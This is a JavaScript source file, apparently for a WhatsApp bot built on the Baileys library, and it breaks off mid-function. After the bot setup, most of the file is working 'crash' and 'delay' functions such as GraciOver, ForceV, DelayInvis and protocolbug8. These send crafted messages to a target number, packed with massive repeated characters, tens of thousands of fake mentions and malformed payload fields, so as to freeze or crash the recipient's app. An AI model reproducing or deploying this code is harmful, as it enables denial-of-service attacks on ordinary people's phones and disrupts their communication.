//CLEAR CONSOLE
console.clear();

//END
//SCANING CONTROL

require('./database/settings')
//END
//INSTALLING BAILEYS

const { default: baileys, downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { 
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
	generateWAMessageContent,
	makeInMemoryStore,
	MediaType,
	areJidsSameUser,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReconnectMode,
	WAContextInfo,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediaConnInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisconnectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header
} = require("@whiskeysockets/baileys");

//END
//EXPORTS BASIC MODULE

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const jimp = require("jimp")
const sharp = require('sharp')
const crypto = require('crypto')
const yts = require('yt-search')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const jsobfus = require('javascript-obfuscator');
const { VocalRemover } = require('./database/pusat/Data8');
const { ocrSpace } = require("ocr-space-api-wrapper");
const { JSDOM } = require('jsdom')

//END
//MODULE MESSAGE + PREFIX

module.exports = sock = async (sock, m, chatUpdate, store) => {
    try {
      var body = (
      m.mtype === "conversation" ? m.message.conversation :
      m.mtype === "imageMessage" ? m.message.imageMessage.caption :
      m.mtype === "videoMessage" ? m.message.videoMessage.caption :
      m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
      m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
      m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
      m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
      m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
      m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);
        var budy = (typeof m.text == 'string' ? m.text : '');
        var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? 
                        body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" 
                      : global.prefa ?? global.prefix
  
//END
//DATA TAMBAHAN + PELENGKAP
const { 
smsg, 
tanggal, 
getTime, 
isUrl, 
sleep, 
clockString, 
runtime, 
fetchJson, 
getBuffer, 
jsonformat, 
format, 
parseMention, 
getRandom, 
getGroupAdm, 
generateProfilePicture 
} = require('./database/pusat/Data1')



//END
//DATA USER + DATA MESSAGE

const Owner = JSON.parse(fs.readFileSync('./account/Own.json'))
const Premium = JSON.parse(fs.readFileSync('./account/Prem.json'))
const isGroup = m.chat.endsWith('@g.us')
const CMD = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const BotNum = await sock.decodeJid(sock.user.id)
const DevOnly = [BotNum, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const PremOnly = [BotNum, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m;
const qtext = q = args.join(" ")
const text = q = args.join(" ");
const cheerio = require('cheerio');
const qtek = m.quoted && m.quoted.message && m.quoted.message.imageMessage;
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await sock.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = m.isGroup ? await groupMetadata.participants : ''
const GroupAdm = m.isGroup ? await getGroupAdm(participants) : ''
const BotAdm = m.isGroup ? GroupAdm.includes(BotNum) : false
const Adm = m.isGroup ? GroupAdm.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const pino = require('pino')
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
const ImageBugs = [
    "https://files.catbox.moe/my7vc8.jpg",
    "https://files.catbox.moe/my7vc8.jpg",
    "https://files.catbox.moe/my7vc8.jpg"
];
const RandomBugs = ImageBugs[Math.floor(Math.random() * ImageBugs.length)];
const imageList = [
    "https://files.catbox.moe/my7vc8.jpg",
    "https://files.catbox.moe/my7vc8.jpg",
    "https://files.catbox.moe/my7vc8.jpg"
];
const RandomMenu = imageList[Math.floor(Math.random() * imageList.length)];
const ApocalypseCrash = fs.readFileSync('./database/pusat/image/v3.jpeg')
const babi = fs.readFileSync('./database/pusat/image/v3.jpeg')
const babi2 = fs.readFileSync('./database/pusat/image/v3.jpeg')

let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
    ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta', // Zona waktu WIB
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});
const mime = (quoted.msg || quoted).mimetype || ''
const THM = "https://files.catbox.moe/my7vc8.jpg"
const Xxx = "https://files.catbox.moe/my7vc8.jpg"


//END
//DATA TIKTOK SCRAPER

const { tiktok } = require('./database/pusat/Data5')
const successreact = ['〽️']
		const finishmoji = successreact[Math.floor(Math.random() * successreact.length)]
		const taskdone = (teks) => {
			return sock.sendMessage(m.chat, {
				react: {
					text: teks,
					key: m.key
				}
			})
		}
//END
//EXPORTS MODULE BRAT + STICKER

const {
imageToWebp, 
videoToWebp, 
writeExifImg, 
writeExifVid, 
writeExif, 
addExif 
} = require('./database/pusat/Data2')
//END

//SEETINGS STATUS BOT
if (!sock.public) {
if (!DevOnly) return
}

//END
//INFO NEW MESSAGE IN CONSOLE

if (command) {
  if (m.isGroup) {
    // Log untuk pesan gruppppppp
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━`));
    console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${command} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  } else {
    // Log untuk pesan privattttttt
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${command} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  }
}




let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
//sock.sendPresenceUpdate(jd, from) // HAPUS UNTUK MEMATIKAN
}

async function loading () {
var Floading = [
"",
"",
""
]
let { key } = await sock.sendMessage(from, {text: " "})
for (let i = 0; i < Floading.length; i++) {
await sock.sendMessage(from, {text: Floading[i], edit: key });
}
}

//END
//FILE RESIZE ( FAKE )

const FileSize = (number) => {
var SI_POSTFIXES = ["B", " KB", " MB", " GB", " TB", " PB", " EB"]
var tier = Math.log10(Math.abs(number)) / 3 | 0
if(tier == 0) return number
var postfix = SI_POSTFIXES[tier]
var scale = Math.pow(10, tier * 3)
var scaled = number / scale
var formatted = scaled.toFixed(1) + ''
if (/\.0$/.test(formatted))
formatted = formatted.substr(0, formatted.length - 2)
return formatted + postfix
}

//END
//FUNCTION OBF

async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `Me`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

//END
var example = (teks) => {
return `Example : ${command} ${teks}`
}

//END
//delay
async function InvisCarousel(target) {
const namebug1 = "VYROSS";
const imagePayload = await prepareWAMessageMedia({
image: { url: 'https://files.catbox.moe/171u4t.jpg', gifPlayback: true }
}, {
upload: sock.waUploadToServer,
mediaType: "image"
});
const cards = Array.from({ length: 5 }).map((_, i) => ({
header: {
title: namebug1 + ` ${i + 1}`,
hasMediaAttachment: true,
imageMessage: imagePayload.imageMessage
},
body: { text: "\u0000".repeat(300) },
nativeFlowMessage: {
buttons: [{
name: "review_order",
buttonParamsJson: JSON.stringify({
reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
order: {
status: "completed",
order_type: "ORDER"
},
share_payment_status: true
})}],
messageParamsJson: {}
}}));
const msg = await generateWAMessageFromContent(
target, {
viewOnceMessage: {
message: {
interactiveMessage: {
body: { text: "" },
footer: { text: "" },
carouselMessage: { cards }
}}}}, {}
);
await sock.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: target },
content: undefined
}]}]}]});
}
//delay
async function bulldozer(sock, target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function loadedIos(target) {
await sock.sendMessage(target, {
text: "🧪‌⃰Ꮡ‌‌" + "⛧ ⊺ΛϻΛ :: CONCƱΣЯЯOR ⛧" + "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
contextInfo: {
externalAdReply: {
title: `⛧ ⊺ΛϻΛ :: CONCƱΣЯЯOR ⛧`,
body: `Haii ${info}`,
previewType: "PHOTO",
thumbnail: "",
sourceUrl: `https://example.com/tama`
}
}
}, { quoted: m })
}

async function loaded(target) {
await sock.sendMessage(target, {
text: "🧪‌⃰Ꮡ‌‌" + "⛧ 𝐀𝐌𝐌 :: 𝐍𝐎𝐓 𝐃𝐄𝐕 ⛧" + "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
contextInfo: {
externalAdReply: {
title: `⛧ 𝐀𝐌𝐌 :: 𝐍𝐎𝐓𝐃𝐄𝐕 ⛧`,
body: `Haii ${info}`,
previewType: "PHOTO",
thumbnail: "",
sourceUrl: `https://example.com/tama`
}
}
}, { quoted: m })
}
async function GraciOver(target, mention = true) {
const nativeFlowResponseMessage = 'some value'; // atau import jika dari file lain
const CrashAPI = "https://www.instagram.com/_u/api_crash_image_raldzz_";

const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".AmmNotDev" + "ꦾ".repeat(9511),
        title: "PhynixAgency",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: CrashAPI,
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
    
   nativeFlowResponseMessage: {
          name: "call_permission_request",
          paramsJson: "\u0000".repeat(1044000),
          name: "call_permission_request",
          paramsJson: "\u0000".repeat(1044000),
          name: "call_permission_request",
          paramsJson: "\u0000".repeat(1044000),
                 version: 3
                        }};

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "1099511627776000",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "ꦾ".repeat(12777),
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
           nativeFlowResponseMessage,
           externalAdReply: {
              showAdAttribution: true,
              title: `☠️ - んジェラルド - ☠️`,
              body: `${"\u0000".repeat(9117)}`,
              mediaType: 1,
              renderLargerThumbnail: true,
              thumbnailUrl: null,
              sourceUrl: `https://${"ꦾ".repeat(100)}.com/`
        },
           businessMessageForwardInfo: {
              businessOwnerJid: target,
        },
            quotedMessage: {
         extendedTextMessage: {
                text: "᭯".repeat(999),
                matchedText: "https://" + "ꦾ".repeat(200) + ".com/" + "ꦾ".repeat(999),
                canonicalUrl: "https://" + "ꦾ".repeat(200) + ".com/" + "ꦾ".repeat(999),
               description: "\u0000".repeat(999),
                title: "\u0000".repeat(999),
                previewType: "NONE",
                jpegThumbnail: Buffer.alloc(10000), 
         contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
         externalAdReply: {
                showAdAttribution: true,
                title: "\u0000".repeat(999),
                body: "\u0000".repeat(999),
                thumbnailUrl: "https://" + "ꦾ".repeat(200) + ".com/" + "ꦾ".repeat(999),
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: "https://" + "ꦾ".repeat(200) + ".com/" + "ꦾ".repeat(999)
            },
            mentionedJid: Array.from({ length: 1000 }, (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
        }
    },
         paymentInviteMessage: {
                currencyCodeIso4217: "USD",
                amount1000: 999999999,
                expiryTimestamp: null,
                inviteMessage: "\u0000".repeat(999),
                serviceType: 1
            }
        },
            isSampled: true,
            mentionedJid: [
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`,
        )
            ]
                      
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "1@newsletter",
            serverMessageId: 1,
            newsletterName: `WaysModzz || Crasher`
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

//fc
async function ForceV(target) {
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          header: {
            title: "SUPER CRASH AMM-V1",
            hasMediaAttachment: false,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
              fileLength: "11887",
              height: 1080,
              width: 1080,
              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                mentionedJid: [target],
                participant: target,
                remoteJid: target,
                expiration: 9741,
                ephemeralSettingTimestamp: 9741,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 9742,
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                }
              },
              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
              scanLengths: [2071, 6199, 1634, 1983],
              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
            }
          },
          body: {
            text: "SUPER CRASH AMM-V1"
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000)
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    additionalNodes: Node,
    messageId: msg.key.id
  });
}
//delay
async function DelayInvis(target, mention) {
  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363421992534354@newsletter@newsletter",
      serverMessageId: 1,
      newsletterName: "𝐀𝐌𝐌 ✦ 𝐍𝐎𝐓𝐃𝐄𝐕"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, messageContent, { userJid: target });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await sock.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await sock.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}
async function protocolbug8(target, mention) {
  const photo = {
    image: imgCrL,
    caption: "𝐀𝐌𝐌 ✦ 𝐍𝐎𝐓𝐃𝐄𝐕"
  };

  const album = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 666, // ubah ke 100 kalau g ke kirim
      expectedVideoCount: 0
    }
  }, {
    userJid: target,
    upload: sock.waUploadToServer
  });

  await sock.relayMessage(target, album.message, { messageId: album.key.id });

  for (let i = 0; i < 666; i++) { // ubah ke 100 / 10 kalau g ke kirim
    const msg = await generateWAMessage(target, photo, {
      upload: client.waUploadToServer
    });

    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: [
      "13135550002@s.whatsapp.net",
        ...Array.from({ length: 30000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
      ],
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      forwardedNewsletterMessageInfo: {
        newsletterName: "Tama Ryuichi | I'm Beginner",
        newsletterJid: "0@newsletter",
        serverMessageId: 1
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await sock.relayMessage(target, {
        statusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
        ]
      });
    }
  }
}
async function ddlay(target, mention) {
  const photo = {
    image: imgCrL,
    caption: "𝐀𝐌𝐌 ✦ 𝐍𝐎𝐓𝐃𝐄𝐕"
  };

  const album = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 666, // ubah ke 100 kalau g ke kirim
      expectedVideoCount: 0
    }
  }, {
    userJid: target,
    upload: sock.waUploadToServer
  });

  await sock.relayMessage(target, album.message, { messageId: album.key.id });

  for (let i = 0; i < 666; i++) { // ubah ke 100 / 10 kalau g ke kirim
    const msg = await generateWAMessage(target, photo, {
      upload: client.waUploadToServer
    });

    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: [
      "13135550002@s.whatsapp.net",
        ...Array.from({ length: 30000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
      ],
